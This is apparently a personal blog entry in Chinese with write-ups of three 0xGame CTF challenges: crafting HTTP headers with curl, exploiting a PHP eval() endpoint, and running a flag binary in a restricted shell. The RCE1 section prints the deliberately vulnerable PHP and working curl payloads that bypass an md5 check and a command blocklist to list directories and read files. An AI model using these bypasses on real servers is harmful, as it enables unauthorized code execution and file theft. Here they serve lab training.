---
title: day4
published: 2025-10-18
description: "一些题目 + curl 指令的用法"
tags: ["ctf", "web", "python"]
category: ctf
draft: false
---

## CTF+ 题目 [Http的真理，我已解明](https://www.ctfplus.cn/problem-detail/1975492176561311744/description)
### 标签: 0xGame Web

题目要求我们用指定的GET POST COOKIE 传入特定的参数 使用特定的浏览器 使用 表示经过代理或者网关, 以及从指定的网站跳转过来
所以得出curl指令
```bash
curl -A "Safari" -H "Referer: www.mihoyo.com" -H "Via: clash" -d "http=good" -b "Sean=god" http://80-95a23249-8263-444a-93e7-a0d59b688e83.challenge.ctfplus.cn/?hello=web
```
得到flag
0XGame{Congratuation_You_Are_Http_God!!!}


所使用的 curl 参数
```txt
-H "Vai: XXX" 指定代理
-H "Referer: XXX" 请求由什么网站跳转到这里

-A            指定访问浏览器
-d            POST 传输
-b            COOKIE 传输
...

```

## CTF+ 题目 [RCE1](https://www.ctfplus.cn/problem-detail/1975492181816774656/description)
### 标签: 0xGame Web
进入靶机发现如下php代码
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$rce1 = $_GET['rce1'];
$rce2 = $_POST['rce2'];
$real_code = $_POST['rce3'];

$pattern = '/(?:\d|[\$%&#@*]|system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i';

function check(string $text): bool {
    global $pattern;
    return (bool) preg_match($pattern, $text);
}


if (isset($rce1) && isset($rce2)){
    if(md5($rce1) === md5($rce2) && $rce1 !== $rce2){
        if(!check($real_code)){
            eval($real_code);
        } else {
            echo "Don't hack me ~";
        }
    } else {
        echo "md5 do not match correctly";
    }
}
else{
    echo "Please provide both rce1 and rce2";
}
?>

```

发现需要使用GET 传入参数rce1, 使用POST 传入参数 rce2, rce3(real_code)
第一层if语句可以看出 本题目要求 **rce1**, **rce2** 的MD5哈希值相同但是字符串不同,而第二层if则要求
输入的**rce3** 中的命令必须不在正则表达式
<br>
 **/(?:\d|[\$%&#@*]|system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i** 
<br>
 的筛选范围内

故可以 将**rce2** **rce1** 设定为 列表因为 php中的md5 不能处理列表 都会返回null,或者将其设定为 经过md5 转化后为0e开头的字符串，因为php会将这种数据视为科学计数法而绕过

所以我们可以构建出curl命令为:
```bash
curl -d "rce2[]=12123&rce3=print_r(scandir('/'));" http://80-a997745a-c1b5-4f34-aa06-65d2d675f958.challenge.ctfplus.cn/?rce1[]=123
```
发现 flag文件
故接下来的问题是怎么 在正则表达式的限制下 读取到文件

所以构件出如下命令:
```bash
curl -d "rce2[]=1&rce3=show_source('/fl'.'ag');" "http://80-a997745a-c1b5-4f34-aa06-65d2d675f958.challenge.ctfplus.cn/?rce1[]=2"
```
成功得到flag: 0xGame{This_is_Your_First_Stop_to_RCE!!!}

#### 笔记
php 常用的函数
1. file_get_contents()
一次性读取整个文件内容到字符串中。
2. file()
将整个文件读取到数组中，每行作为数组的一个元素。
3. readfile()
直接读取文件并输出到浏览器，适合文件下载。
4. show_source();
5. include

6. scandir() 获取目录
7. print_r() 打印

## CTF+ 题目 [命令执行🤔](https://www.ctfplus.cn/problem-detail/1975492230630084608/description)
### 标签:0xGame PWN
进入题目提供的nc地址时 发现除了echo, ls命令其他所有命令都不能使用
使用ls 发现文件目录中存在flag 文件
继续ls -l 该文件发现该文件是一个可执行文件所以输入
```bash
. ./flag
```
执行文件得到flag：0xGame{y0u_c4n_4ls0_3x3cu73_c0mm4nd_w17h0u7_5h_4nd_c47}
